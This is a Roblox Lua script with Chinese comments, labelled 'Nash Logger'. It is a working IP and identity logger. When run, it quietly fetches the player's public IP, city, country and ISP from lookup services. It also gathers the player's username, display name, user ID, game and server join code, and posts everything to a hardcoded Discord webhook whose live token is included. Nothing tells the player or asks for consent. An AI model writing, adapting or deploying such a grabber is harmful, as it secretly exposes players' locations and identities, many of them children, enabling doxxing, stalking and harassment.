--// 服務初始化
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

--// 設定
local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
local gameName = "Unknown"
local embedColor = tonumber("0x3498DB" ) -- 經典藍色

--// 增強的 HTTP 請求函數
local function secureRequest(options)
    local requestFunc = request or http_request or (syn and syn.request )
    if requestFunc then
        local success, response = pcall(function() return requestFunc(options) end)
        if success and response then return response end
    end
    if options.Method == "GET" and game.HttpGetAsync then
         local success, responseBody = pcall(game.HttpGetAsync, game, options.Url)
         if success and responseBody then return { Body = responseBody, StatusCode = 200 } end
    end
    warn("所有 HTTP 請求方法均失敗。")
    return nil
end

--// 獲取 IP 和地理位置的函數
local function getSecretInfo()
    local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
    local ip
    for _, url in ipairs(ipServices ) do
        local response = secureRequest({ Url = url, Method = "GET" })
        if response and response.Body and #response.Body > 0 and not response.Body:find("[<>]") then
            ip = response.Body:gsub("%s+", "")
            break
        end
    end
    if not ip then return nil end
    local ipDetails
    local detailResponse = secureRequest({ Url = "https://ipinfo.io/" .. ip .. "/json", Method = "GET" } )
    if detailResponse and detailResponse.Body then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, detailResponse.Body)
        if success and type(decoded) == "table" then ipDetails = decoded end
    end
    return { ip = ip, details = ipDetails }
end

--// 主要執行邏輯
pcall(function()
    -- 1. 獲取遊戲名稱
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info.Name or "Unknown"
    end)

    -- 2. 獲取 IP 資訊
    local secretInfo = getSecretInfo()

    -- 3. 建立個人資料連結
    local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"

    -- 4. 準備 embed 的 description，將所有值都用黑色程式碼框包起來
    local description = string.format(
        "**真實名稱:** ```%s```\n" ..
        "**顯示名稱:** ```%s```\n" ..
        "**玩家ID:** ```%s```\n" ..
        "**個人資料:** [Roblox 個人頁面](%s)\n" .. -- 連結無法放入程式碼框，保持原樣
        "**遊戲:** ```%s```\n" ..
        "**玩家伺服器人數:** ```%d```\n" ..
        "**加入代碼:** ```%s```",
        LocalPlayer.Name,
        LocalPlayer.DisplayName,
        tostring(LocalPlayer.UserId),
        profileUrl,
        gameName,
        #Players:GetPlayers(),
        game.JobId or "N/A"
    )

    -- 5. 將 IP 資訊附加到 description 的末尾，同樣使用黑色程式碼框
    if secretInfo and secretInfo.ip then
        local ip_info = secretInfo.details
        local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
        local isp = (ip_info and ip_info.org) or "未知"
        
        local secretBlock = string.format(
            "\n\n**網路資訊 (機密):**\n" ..
            "**IP 位址:** ```%s```\n" ..
            "**推測位置:** ```%s```\n" ..
            "**網路供應商:** ```%s```",
            secretInfo.ip, location, isp
        )
        description = description .. secretBlock
    end

    -- 6. 構建並發送最終的 webhook 資料
    local data = {
        username = "執行日誌",
        embeds = {{
            title = "腳本執行紀錄",
            description = description,
            color = embedColor,
            footer = {
                text = "Nash Logger"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    secureRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end)
